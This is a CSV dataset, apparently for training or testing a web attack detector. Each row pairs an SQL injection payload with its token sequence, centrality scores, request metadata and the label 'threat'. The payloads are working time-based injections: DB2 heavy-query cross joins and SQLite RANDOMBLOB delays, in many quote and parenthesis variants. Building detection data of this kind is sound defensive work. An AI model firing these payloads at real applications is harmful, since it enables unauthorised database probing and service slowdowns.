payload,token,centrality,reqmethod,length,uagent,class,label
"rob.star@gmail.com' OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- Alxl",STR DOT STAR ATR STR DOT STR SQUT OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR DSCMT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,GET,126,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (6558=6558",STR DOT STAR ATR STR DOT STR RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN INT EQ INT,0.1111111111111111 0.1388888888888889 0.16666666666666666 0.19444444444444442 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.19444444444444442 0.16666666666666666 0.1388888888888889 0.1111111111111111,GET,134,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com)) OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((8093=8093",STR DOT STAR ATR STR DOT STR RPRN RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN INT EQ INT,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,136,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)",STR DOT STAR ATR STR DOT STR OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR,0.13333333333333333 0.16666666666666666 0.2 0.23333333333333334 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.23333333333333334 0.2 0.16666666666666666 0.13333333333333333,GET,118,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com') OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ('vsbD'='vsbD",STR DOT STAR ATR STR DOT STR SQUT RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN SQUT STR SQUT EQ SQUT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,138,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com'))) OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((('fTXI'='fTXI",STR DOT STAR ATR STR DOT STR SQUT RPRN RPRN RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.09090909090909091 0.11363636363636365 0.13636363636363635 0.1590909090909091 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.18181818181818182 0.1590909090909091 0.13636363636363635 0.11363636363636365 0.09090909090909091,GET,142,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com') OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ('xsNh' LIKE 'xsNh",STR DOT STAR ATR STR DOT STR SQUT RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN SQUT STR SQUT LIKE SQUT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,143,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com' OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'tIHD' LIKE 'tIHD",STR DOT STAR ATR STR DOT STR SQUT OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND SQUT STR SQUT LIKE SQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,141,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"") OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND (""Bgvx""=""Bgvx",STR DOT STAR ATR STR DOT STR DQUT RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN DQUT STR DQUT EQ DQUT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,138,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"")) OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((""HGWj""=""HGWj",STR DOT STAR ATR STR DOT STR DQUT RPRN RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.09523809523809523 0.11904761904761904 0.14285714285714285 0.16666666666666666 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.19047619047619047 0.16666666666666666 0.14285714285714285 0.11904761904761904 0.09523809523809523,GET,140,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""xpOG""=""xpOG",STR DOT STAR ATR STR DOT STR DQUT OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND DQUT STR DQUT EQ DQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,136,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com"" OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ""fPXE"" LIKE ""fPXE",STR DOT STAR ATR STR DOT STR DQUT OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND DQUT STR DQUT LIKE DQUT STR,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,141,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%') OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND LPRN SQUT PRCNT SQUT EQ SQUT,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,132,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com%' OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR AND SQUT PRCNT SQUT EQ SQUT,0.10526315789473684 0.13157894736842105 0.15789473684210525 0.18421052631578946 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.21052631578947367 0.18421052631578946 0.15789473684210525 0.13157894736842105 0.10526315789473684,GET,130,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com OR 6093=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- knUo",STR DOT STAR ATR STR DOT STR OR INT EQ SELECT STR STAR FROM STR DOT STR AS STR CMMA STR DOT STR AS STR CMMA STR DOT STR AS STR DSCMT STR,0.125 0.15625 0.1875 0.21875 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.21875 0.1875 0.15625 0.125,GET,125,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) AND 9111=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- LFiY",STR DOT STAR ATR STR DOT STR RPRN AND INT EQ LIKE SQUT STR SQUT CMMA STR HEX STR INT SLSH INT DSCMT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,GET,87,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com) AND 9111=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND (9305=9305",STR DOT STAR ATR STR DOT STR RPRN AND INT EQ LIKE SQUT STR SQUT CMMA STR HEX STR INT SLSH INT AND LPRN INT EQ INT,0.15384615384615385 0.19230769230769232 0.23076923076923078 0.2692307692307693 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.2692307692307693 0.23076923076923078 0.19230769230769232 0.15384615384615385,GET,95,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com)) AND 9111=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ((4565=4565",STR DOT STAR ATR STR DOT STR RPRN RPRN AND INT EQ LIKE SQUT STR SQUT CMMA STR HEX STR INT SLSH INT AND LPRN LPRN INT EQ INT,0.14285714285714285 0.17857142857142855 0.21428571428571427 0.25 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.25 0.21428571428571427 0.17857142857142855 0.14285714285714285,GET,97,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com AND 9111=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",STR DOT STAR ATR STR DOT STR AND INT EQ LIKE SQUT STR SQUT CMMA STR HEX STR INT SLSH INT,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,79,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
"rob.star@gmail.com') AND 9111=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ('BQhg'='BQhg",STR DOT STAR ATR STR DOT STR SQUT RPRN AND INT EQ LIKE SQUT STR SQUT CMMA STR HEX STR INT SLSH INT AND LPRN SQUT STR SQUT EQ SQUT STR,0.13333333333333333 0.16666666666666666 0.2 0.23333333333333334 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.23333333333333334 0.2 0.16666666666666666 0.13333333333333333,GET,99,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,inference
